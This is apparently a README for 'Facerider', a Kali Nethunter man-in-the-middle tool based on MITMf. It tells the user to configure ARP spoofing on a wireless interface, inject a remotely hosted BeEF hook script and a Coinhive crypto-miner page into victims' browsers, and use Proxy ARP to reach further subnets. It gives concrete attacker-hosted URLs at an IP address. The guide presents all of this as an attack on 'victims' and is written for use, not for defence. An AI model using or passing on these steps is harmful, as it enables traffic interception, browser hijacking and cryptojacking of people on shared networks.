Thank for you downloading and installing Facerider into your Nethunter device. To get started...

# Configure the mitmf.cfg file

If you are using a cell phone or tablet with Kali Nethunter installed, you should change the following lines to the following values

INTERFACE = wlan0 // instead of eth0

AUTO_ACQUIRE_GATEWAY = 1

# Additional injectable parameters

And optionally set JS_URL to a link with malicious Javascript payloads being hosted remotely, such as a Beef Framework Hook.

Example: JS_URL = http://18.232.199.30:3000/hook.js

You can also set HTML_URL to a page that hosts a coinhive crypto-miner script, thereby enslaving all of your injected victims with Monero miners until they close the tab on their browser

Example: HTML_URL = http://18.232.199.30/injectcoinhive.html

# Run Facerider

Open a Kali terminal and navigate to your Facerider directory, and then <code>python Facerider.py</code>. You have only one more step, selecting the gateway that is auto-detected to commence the attack. Do not close this window.

Alternatively, you can add it as a convenient custom command in the Custom Commands tab of your Nethunter app.

# Offensive ARP Proxies

Advanced users might consider switching PROXY_ARP_MODE = 1 to take advantage of bridging multiple NICs with Proxy ARP, allowing two entirely separate networks to talk to each other. It's also useful for immediately attacking subnets not just within your immediate locate subnet.

Proxy ARP is unique in being able to merge the connected networks of a WIRELESS CARD to the connected networks of a ETHERNET CARD, opening up new attack possibilities and theories.

However, combined with ARP spoofing, the matters complicate significantly and you can end up crashing local routers through irresponsible and reckless abuse of Proxy ARP. Always limit your target(s) to a small range or preferably, a single host for ARP spoofing when using Offensive Proxy ARP.
